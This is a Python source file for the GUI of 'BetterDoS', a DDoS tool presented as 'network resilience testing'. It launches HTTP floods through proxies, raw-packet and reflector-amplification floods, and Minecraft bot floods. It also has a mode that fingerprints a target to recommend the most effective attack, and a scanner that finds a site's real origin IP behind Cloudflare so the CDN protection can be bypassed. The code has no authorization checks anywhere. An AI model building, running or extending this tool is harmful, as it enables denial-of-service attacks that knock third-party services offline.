#!/usr/bin/env python3
"""BetterDoS GUI — tkinter frontend for all attack modes."""

import io
import sys
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
from contextlib import suppress
from pathlib import Path
from socket import AF_INET, SOCK_STREAM, gethostbyname, socket
from time import sleep, time
from typing import Any

from yarl import URL

from betterdos.core import (BYTES_SEND, REQUESTS_SENT, ROOT_DIR, Methods, Tools,
                            con, logger, RUN_ID)
from betterdos.advisor import MethodAdvisor
from betterdos.console import CloudflareScanner, _is_cloudflare_ip
from betterdos.layer4 import Layer4
from betterdos.layer7 import HttpFlood, BOMBARDIER_PATH
from betterdos.minecraft import Minecraft
from betterdos.output import L7_DESCRIPTIONS, L4_DESCRIPTIONS
from betterdos.proxy import handleProxyList

# ── Colours ──────────────────────────────────────────────────────────────
BG       = "#1e1e2e"
BG_INPUT = "#313244"
FG       = "#cdd6f4"
FG_DIM   = "#6c7086"
ACCENT   = "#89b4fa"
GREEN    = "#a6e3a1"
RED      = "#f38ba8"
YELLOW   = "#f9e2af"
SURFACE  = "#45475a"


class OutputCapture:
    """Thread-safe capture of stdout/stderr into a tkinter Text widget."""

    def __init__(self, widget: scrolledtext.ScrolledText, tag: str = "stdout"):
        self._widget = widget
        self._tag = tag

    def write(self, text: str):
        if not text:
            return
        # Strip ANSI escape codes for the GUI
        import re
        clean = re.sub(r'\033\[[0-9;]*m', '', text)
        clean = clean.replace('\r', '')
        if not clean:
            return
        self._widget.after(0, self._append, clean)

    def _append(self, text: str):
        self._widget.configure(state="normal")
        self._widget.insert(tk.END, text, self._tag)
        self._widget.see(tk.END)
        self._widget.configure(state="disabled")

    def flush(self):
        pass


class BetterDoSGUI:
    PROXY_TYPES = {"All (config.json)": 0, "HTTP": 1, "SOCKS4": 4, "SOCKS5": 5, "Random": 6}

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BetterDoS — Network Resilience Testing")
        self.root.configure(bg=BG)
        self.root.minsize(960, 700)

        self._attack_event = None
        self._running = False

        style = ttk.Style()
        style.theme_use("clam")
        style.configure(".", background=BG, foreground=FG, fieldbackground=BG_INPUT)
        style.configure("TFrame", background=BG)
        style.configure("TLabel", background=BG, foreground=FG, font=("Segoe UI", 10))
        style.configure("TLabelframe", background=BG, foreground=ACCENT, font=("Segoe UI", 10, "bold"))
        style.configure("TLabelframe.Label", background=BG, foreground=ACCENT)
        style.configure("Header.TLabel", font=("Segoe UI", 14, "bold"), foreground=ACCENT, background=BG)
        style.configure("TButton", background=SURFACE, foreground=FG, font=("Segoe UI", 10, "bold"),
                         borderwidth=0, padding=(12, 6))
        style.map("TButton", background=[("active", ACCENT)], foreground=[("active", BG)])
        style.configure("Accent.TButton", background=ACCENT, foreground=BG)
        style.map("Accent.TButton",
                  background=[("disabled", SURFACE), ("active", GREEN)],
                  foreground=[("disabled", FG_DIM), ("active", BG)])
        style.configure("Stop.TButton", background=RED, foreground=BG)
        style.map("Stop.TButton",
                  background=[("disabled", SURFACE), ("active", "#e06c75")],
                  foreground=[("disabled", FG_DIM), ("active", BG)])
        style.configure("TCombobox", fieldbackground=BG_INPUT, background=SURFACE,
                         foreground=FG, selectbackground=ACCENT, selectforeground=BG)
        style.configure("TEntry", fieldbackground=BG_INPUT, foreground=FG, insertcolor=FG)
        style.configure("TSpinbox", fieldbackground=BG_INPUT, foreground=FG, insertcolor=FG)
        style.configure("TNotebook", background=BG)
        style.configure("TNotebook.Tab", background=SURFACE, foreground=FG, padding=(14, 6),
                         font=("Segoe UI", 10))
        style.map("TNotebook.Tab", background=[("selected", BG)], foreground=[("selected", ACCENT)])

        self._build_ui()

    # ── UI Construction ──────────────────────────────────────────────────

    def _build_ui(self):
        # Header
        hdr = ttk.Frame(self.root)
        hdr.pack(fill="x", padx=16, pady=(12, 0))
        ttk.Label(hdr, text="BetterDoS", style="Header.TLabel").pack(side="left")
        ttk.Label(hdr, text="Network Resilience Testing Framework",
                  foreground=FG_DIM, font=("Segoe UI", 10)).pack(side="left", padx=(10, 0))

        # Main paned: left = controls, right = output
        paned = ttk.PanedWindow(self.root, orient="horizontal")
        paned.pack(fill="both", expand=True, padx=12, pady=8)

        left = ttk.Frame(paned)
        right = ttk.Frame(paned)
        paned.add(left, weight=1)
        paned.add(right, weight=2)

        self._build_controls(left)
        self._build_output(right)

    def _build_controls(self, parent):
        # ── Mode selector (tabs) ─────────────────────────────────────
        nb = ttk.Notebook(parent)
        nb.pack(fill="both", expand=True)

        self._build_attack_tab(nb)
        self._build_advise_tab(nb)
        self._build_auto_tab(nb)
        self._build_cfip_tab(nb)

    def _build_attack_tab(self, nb):
        f = ttk.Frame(nb, padding=10)
        nb.add(f, text=" Attack ")

        # Target
        ttk.Label(f, text="Target (URL or ip:port) *").pack(anchor="w", pady=(0, 2))
        self.target_var = tk.StringVar()
        ttk.Entry(f, textvariable=self.target_var, width=40).pack(fill="x", pady=(0, 8))

        # Method
        ttk.Label(f, text="Method *").pack(anchor="w", pady=(0, 2))
        method_frame = ttk.Frame(f)
        method_frame.pack(fill="x", pady=(0, 2))

        # Build display list with [L7]/[L4] prefixes
        l7_items = [f"[L7] {m}" for m in sorted(Methods.LAYER7_METHODS)]
        l4_items = [f"[L4] {m}" for m in sorted(Methods.LAYER4_METHODS)]
        all_display = l7_items + l4_items
        self.method_var = tk.StringVar(value="[L7] GET")
        self.method_combo = ttk.Combobox(method_frame, textvariable=self.method_var,
                                          values=all_display, state="readonly", width=20)
        self.method_combo.pack(side="left")
        self.method_desc = ttk.Label(method_frame, text="", foreground=FG_DIM,
                                      font=("Segoe UI", 9), wraplength=260)
        self.method_desc.pack(side="left", padx=(8, 0))
        self.method_combo.bind("<<ComboboxSelected>>", self._on_method_change)

        # Layer hint
        self.layer_hint = ttk.Label(f, text="", foreground=FG_DIM, font=("Segoe UI", 8))
        self.layer_hint.pack(anchor="w", pady=(0, 4))
        self._on_method_change()

        # Threads
        ttk.Label(f, text="Threads").pack(anchor="w", pady=(4, 2))
        self.threads_var = tk.StringVar(value="100")
        ttk.Spinbox(f, from_=1, to=10000, textvariable=self.threads_var, width=10).pack(anchor="w", pady=(0, 8))

        # Duration
        ttk.Label(f, text="Duration (seconds)").pack(anchor="w", pady=(0, 2))
        self.duration_var = tk.StringVar(value="120")
        ttk.Spinbox(f, from_=1, to=86400, textvariable=self.duration_var, width=10).pack(anchor="w", pady=(0, 8))

        # RPC (L7 only)
        ttk.Label(f, text="RPC — requests per connection (L7 only)").pack(anchor="w", pady=(0, 2))
        self.rpc_var = tk.StringVar(value="100")
        ttk.Spinbox(f, from_=1, to=1000, textvariable=self.rpc_var, width=10).pack(anchor="w", pady=(0, 8))

        # Proxy type
        ttk.Label(f, text="Proxy Type").pack(anchor="w", pady=(0, 2))
        self.proxy_type_var = tk.StringVar(value="All (config.json)")
        ttk.Combobox(f, textvariable=self.proxy_type_var,
                     values=list(self.PROXY_TYPES.keys()), state="readonly", width=20).pack(anchor="w", pady=(0, 8))

        # Proxy file
        ttk.Label(f, text="Proxy File (inside files/proxies/)").pack(anchor="w", pady=(0, 2))
        pf = ttk.Frame(f)
        pf.pack(fill="x", pady=(0, 8))
        self.proxy_file_var = tk.StringVar(value="http.txt")
        ttk.Entry(pf, textvariable=self.proxy_file_var, width=28).pack(side="left")
        ttk.Button(pf, text="Browse", command=self._browse_proxy).pack(side="left", padx=(6, 0))

        # Reflector file (amplification only)
        ttk.Label(f, text="Reflector File (amplification methods only)").pack(anchor="w", pady=(0, 2))
        self.reflector_var = tk.StringVar()
        ttk.Entry(f, textvariable=self.reflector_var, width=40).pack(fill="x", pady=(0, 12))

        # Buttons
        btn_frame = ttk.Frame(f)
        btn_frame.pack(fill="x", pady=(4, 0))
        self.start_btn = ttk.Button(btn_frame, text="▶  Start Attack", style="Accent.TButton",
                                     command=self._start_attack)
        self.start_btn.pack(side="left", padx=(0, 8))
        self.stop_btn = ttk.Button(btn_frame, text="■  Stop", style="Stop.TButton",
                                    command=self._stop_attack, state="disabled")
        self.stop_btn.pack(side="left")

    def _build_advise_tab(self, nb):
        f = ttk.Frame(nb, padding=10)
        nb.add(f, text=" Advise ")

        ttk.Label(f, text="Target (URL or ip:port) *").pack(anchor="w", pady=(0, 2))
        self.advise_target_var = tk.StringVar()
        ttk.Entry(f, textvariable=self.advise_target_var, width=40).pack(fill="x", pady=(0, 8))

        ttk.Label(f, text="Fingerprints the target and recommends the best attack\n"
                          "methods without sending attack traffic.",
                  foreground=FG_DIM, font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 12))

        ttk.Button(f, text="▶  Run ADVISE", style="Accent.TButton",
                   command=self._run_advise).pack(anchor="w")

    def _build_auto_tab(self, nb):
        f = ttk.Frame(nb, padding=10)
        nb.add(f, text=" Auto ")

        ttk.Label(f, text="Target (URL or ip:port) *").pack(anchor="w", pady=(0, 2))
        self.auto_target_var = tk.StringVar()
        ttk.Entry(f, textvariable=self.auto_target_var, width=40).pack(fill="x", pady=(0, 8))

        ttk.Label(f, text="Threads per probe").pack(anchor="w", pady=(0, 2))
        self.auto_threads_var = tk.StringVar(value="5")
        ttk.Spinbox(f, from_=1, to=1000, textvariable=self.auto_threads_var, width=10).pack(anchor="w", pady=(0, 8))

        ttk.Label(f, text="Probe duration (seconds per method)").pack(anchor="w", pady=(0, 2))
        self.auto_duration_var = tk.StringVar(value="10")
        ttk.Spinbox(f, from_=1, to=300, textvariable=self.auto_duration_var, width=10).pack(anchor="w", pady=(0, 8))

        ttk.Label(f, text="RPC per probe").pack(anchor="w", pady=(0, 2))
        self.auto_rpc_var = tk.StringVar(value="5")
        ttk.Spinbox(f, from_=1, to=100, textvariable=self.auto_rpc_var, width=10).pack(anchor="w", pady=(0, 8))

        ttk.Label(f, text="Proxy Type").pack(anchor="w", pady=(0, 2))
        self.auto_proxy_type_var = tk.StringVar(value="All (config.json)")
        ttk.Combobox(f, textvariable=self.auto_proxy_type_var,
                     values=list(self.PROXY_TYPES.keys()), state="readonly", width=20).pack(anchor="w", pady=(0, 8))

        ttk.Label(f, text="Proxy File (optional)").pack(anchor="w", pady=(0, 2))
        self.auto_proxy_file_var = tk.StringVar()
        ttk.Entry(f, textvariable=self.auto_proxy_file_var, width=40).pack(fill="x", pady=(0, 12))

        ttk.Label(f, text="Probes every candidate method, measures PPS/BPS,\n"
                          "ranks results and recommends the best method.",
                  foreground=FG_DIM, font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 12))

        ttk.Button(f, text="▶  Run AUTO", style="Accent.TButton",
                   command=self._run_auto).pack(anchor="w")

    def _build_cfip_tab(self, nb):
        f = ttk.Frame(nb, padding=10)
        nb.add(f, text=" CFIP ")

        ttk.Label(f, text="Domain *").pack(anchor="w", pady=(0, 2))
        self.cfip_target_var = tk.StringVar()
        ttk.Entry(f, textvariable=self.cfip_target_var, width=40).pack(fill="x", pady=(0, 8))

        ttk.Label(f, text="Discovers the real origin IP behind Cloudflare via\n"
                          "subdomain enumeration, MX records, and SPF/TXT parsing.",
                  foreground=FG_DIM, font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 12))

        ttk.Button(f, text="▶  Scan for Origin IP", style="Accent.TButton",
                   command=self._run_cfip).pack(anchor="w")

    def _build_output(self, parent):
        ttk.Label(parent, text="Output", style="Header.TLabel").pack(anchor="w", pady=(0, 4))

        self.output = scrolledtext.ScrolledText(
            parent, wrap="word", state="disabled",
            bg=BG_INPUT, fg=FG, insertbackground=FG,
            font=("Cascadia Mono", 10), relief="flat", borderwidth=0,
            padx=8, pady=8,
        )
        self.output.pack(fill="both", expand=True)
        self.output.tag_configure("stdout", foreground=FG)
        self.output.tag_configure("stderr", foreground=YELLOW)

        btn_bar = ttk.Frame(parent)
        btn_bar.pack(fill="x", pady=(4, 0))
        ttk.Button(btn_bar, text="Clear", command=self._clear_output).pack(side="right")

    # ── Event handlers ───────────────────────────────────────────────────

    def _get_raw_method(self) -> str:
        """Strip the [L7]/[L4] prefix from the combo value."""
        val = self.method_var.get()
        if val.startswith("["):
            return val.split("] ", 1)[-1]
        return val

    def _on_method_change(self, event=None):
        m = self._get_raw_method()
        desc = L7_DESCRIPTIONS.get(m) or L4_DESCRIPTIONS.get(m, "")
        self.method_desc.configure(text=desc)
        if m in Methods.LAYER7_METHODS:
            self.layer_hint.configure(
                text="L7 = HTTP layer. Target by URL/domain. Requires proxies.")
        elif m in Methods.LAYER4_METHODS:
            self.layer_hint.configure(
                text="L4 = Transport layer. Target by IP:port. Raw packets, no proxy needed.")
        else:
            self.layer_hint.configure(text="")

    def _browse_proxy(self):
        p = filedialog.askopenfilename(
            initialdir=str(ROOT_DIR / "files" / "proxies"),
            title="Select Proxy File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if p:
            self.proxy_file_var.set(Path(p).name)

    def _clear_output(self):
        self.output.configure(state="normal")
        self.output.delete("1.0", tk.END)
        self.output.configure(state="disabled")

    def _log(self, text: str, tag: str = "stdout"):
        self.output.after(0, self._append_output, text, tag)

    def _append_output(self, text: str, tag: str):
        self.output.configure(state="normal")
        self.output.insert(tk.END, text + "\n", tag)
        self.output.see(tk.END)
        self.output.configure(state="disabled")

    def _run_in_thread(self, target, *args):
        """Run a function in a background thread with stdout/stderr captured."""
        def worker():
            old_stdout, old_stderr = sys.stdout, sys.stderr
            cap = OutputCapture(self.output)
            sys.stdout = cap
            sys.stderr = OutputCapture(self.output, "stderr")
            try:
                target(*args)
            except SystemExit:
                pass
            except Exception as e:
                self._log(f"Error: {e}", "stderr")
            finally:
                sys.stdout = old_stdout
                sys.stderr = old_stderr

        t = threading.Thread(target=worker, daemon=True)
        t.start()

    # ── ADVISE ───────────────────────────────────────────────────────────

    def _run_advise(self):
        target = self.advise_target_var.get().strip()
        if not target:
            messagebox.showwarning("Missing Field", "Enter a target URL or ip:port.")
            return
        self._clear_output()
        self._log(f"[ADVISE] Fingerprinting {target} ...")
        self._run_in_thread(MethodAdvisor.advise, target)

    # ── AUTO ─────────────────────────────────────────────────────────────

    def _run_auto(self):
        target = self.auto_target_var.get().strip()
        if not target:
            messagebox.showwarning("Missing Field", "Enter a target URL or ip:port.")
            return
        self._clear_output()
        threads = int(self.auto_threads_var.get())
        duration = int(self.auto_duration_var.get())
        rpc = int(self.auto_rpc_var.get())
        proxy_ty = self.PROXY_TYPES[self.auto_proxy_type_var.get()]
        proxy_file = self.auto_proxy_file_var.get().strip()
        self._log(f"[AUTO] Benchmarking {target} — {threads} threads, {duration}s per probe ...")
        self._run_in_thread(MethodAdvisor.auto, target, threads, duration, rpc, proxy_ty, proxy_file)

    # ── CFIP ─────────────────────────────────────────────────────────────

    def _run_cfip(self):
        domain = self.cfip_target_var.get().strip()
        if not domain:
            messagebox.showwarning("Missing Field", "Enter a domain.")
            return
        domain = domain.replace("https://", "").replace("http://", "")
        if "/" in domain:
            domain = domain.split("/")[0]
        self._clear_output()
        self._log(f"[CFIP] Scanning for origin IP of {domain} ...")

        def run():
            results = CloudflareScanner.find_origin(domain)
            CloudflareScanner.print_results(domain, results)

        self._run_in_thread(run)

    # ── ATTACK ───────────────────────────────────────────────────────────

    def _start_attack(self):
        target_raw = self.target_var.get().strip()
        method = self.method_var.get()
        if not target_raw:
            messagebox.showwarning("Missing Field", "Enter a target URL or ip:port.")
            return
        if not method:
            messagebox.showwarning("Missing Field", "Select an attack method.")
            return
        method = self._get_raw_method()

        self._clear_output()
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self._running = True

        def attack_worker():
            try:
                self._run_attack(target_raw, method)
            finally:
                self._running = False
                self.root.after(0, self._on_attack_done)

        t = threading.Thread(target=attack_worker, daemon=True)
        t.start()

    def _on_attack_done(self):
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")

    def _stop_attack(self):
        if self._attack_event:
            self._attack_event.clear()
        self._running = False
        self._log("[STOPPED] Attack stopped by user.", "stderr")

    def _run_attack(self, target_raw: str, method: str):
        old_stdout, old_stderr = sys.stdout, sys.stderr
        cap = OutputCapture(self.output)
        sys.stdout = cap
        sys.stderr = OutputCapture(self.output, "stderr")

        try:
            urlraw = target_raw.strip().rstrip("/")

            # Normalise: accept bare domains, ip:port, or full URLs
            if "://" not in urlraw:
                # Bare domain or ip:port — default to http
                urlraw = "http://" + urlraw

            url = URL(urlraw)
            if not url.host:
                print("Error: Could not parse a hostname from the target. "
                      "Enter a domain (e.g. fakeurl.com) or ip:port (e.g. 1.2.3.4:80).")
                return

            threads = int(self.threads_var.get())
            timer = int(self.duration_var.get())
            rpc = int(self.rpc_var.get())
            proxy_ty = self.PROXY_TYPES[self.proxy_type_var.get()]

            event = threading.Event()
            event.clear()
            self._attack_event = event

            if method in Methods.LAYER7_METHODS:
                host = url.host
                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        print(f"Error: Cannot resolve hostname {url.host}: {e}")
                        return

                # CF check for L7 targeting IP directly
                if _is_cloudflare_ip(host):
                    print(f"⚠ Cloudflare IP detected ({host}). L7 methods can still work through the proxy.")

                proxy_li = Path(ROOT_DIR / "files/proxies/" / self.proxy_file_var.get().strip())
                useragent_li = Path(ROOT_DIR / "files/useragent.txt")
                referers_li = Path(ROOT_DIR / "files/referers.txt")

                uagents = set()
                referers = set()
                if useragent_li.exists():
                    uagents = {a.strip() for a in useragent_li.read_text().splitlines() if a.strip()}
                if referers_li.exists():
                    referers = {a.strip() for a in referers_li.read_text().splitlines() if a.strip()}

                proxies = handleProxyList(con, proxy_li, proxy_ty, threads, url)

                for tid in range(threads):
                    HttpFlood(tid, url, host, method, rpc, event,
                              uagents or None, referers or None, proxies).start()

                target_display = url.host
                port_display = url.port or 80

            elif method in Methods.LAYER4_METHODS:
                port = url.port
                target_host = url.host
                try:
                    target_host = gethostbyname(target_host)
                except Exception as e:
                    print(f"Error: Cannot resolve hostname {url.host}: {e}")
                    return

                if not port:
                    port = 80

                # CF check — block L4 attacks against Cloudflare IPs
                if _is_cloudflare_ip(target_host):
                    print(f"✖ BLOCKED: {target_host} is a Cloudflare IP.")
                    print("  L4 attacks against Cloudflare IPs are ineffective and wasteful.")
                    print("  Use the CFIP tab to discover the origin IP, or use L7 methods instead.")
                    return

                proxies = None
                ref = None

                # Handle reflector file for amplification methods
                refl_file = self.reflector_var.get().strip()
                if method in Methods.LAYER4_AMP:
                    if not refl_file:
                        print(f"Error: {method} requires a reflector file.")
                        return
                    refl_li = Path(ROOT_DIR / "files" / refl_file)
                    if not refl_li.exists():
                        print(f"Error: Reflector file not found: {refl_li}")
                        return
                    ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
                    if not ref:
                        print("Error: Empty reflector file.")
                        return

                # Handle proxy for applicable L4 methods
                if method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                    proxy_li = Path(ROOT_DIR / "files/proxies/" / self.proxy_file_var.get().strip())
                    if proxy_li.exists():
                        from PyRoxy import ProxyUtiles
                        proxies = ProxyUtiles.readFromFile(proxy_li)

                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                for _ in range(threads):
                    Layer4((target_host, port), ref, method, event,
                           proxies, protocolid).start()

                target_display = target_host
                port_display = port
            else:
                print(f"Error: Unknown method {method}")
                return

            # ── Progress loop ─────────────────────────────────────────
            print(f"\n[run:{RUN_ID}] Attack Started → {target_display}:{port_display}"
                  f"  method={method}  duration={timer}s  threads={threads}\n")
            event.set()
            ts = time()
            end_ts = ts + timer

            while time() < end_ts and self._running:
                now = time()
                pps = int(REQUESTS_SENT)
                bps = int(BYTES_SEND)
                elapsed = int(now - ts)
                remaining = max(0, timer - elapsed)
                pct = min(100, int(elapsed / timer * 100)) if timer > 0 else 0
                filled = pct // 5
                bar = '\u2588' * filled + '\u2591' * (20 - filled)

                print(f"[{method}] {target_display}:{port_display}  "
                      f"PPS: {Tools.humanformat(pps)}  "
                      f"BPS: {Tools.humanbytes(bps)}  "
                      f"{bar} {pct}% [{remaining}s]")

                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            event.clear()
            self._attack_event = None
            if self._running:
                print(f"\n[DONE] Attack completed after {timer}s.")
            else:
                print(f"\n[STOPPED] Attack stopped after {int(time() - ts)}s.")

        except Exception as e:
            print(f"Error: {e}")
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr

    # ── Run ──────────────────────────────────────────────────────────────

    def run(self):
        self.root.mainloop()


def main():
    app = BetterDoSGUI()
    app.run()


if __name__ == "__main__":
    main()
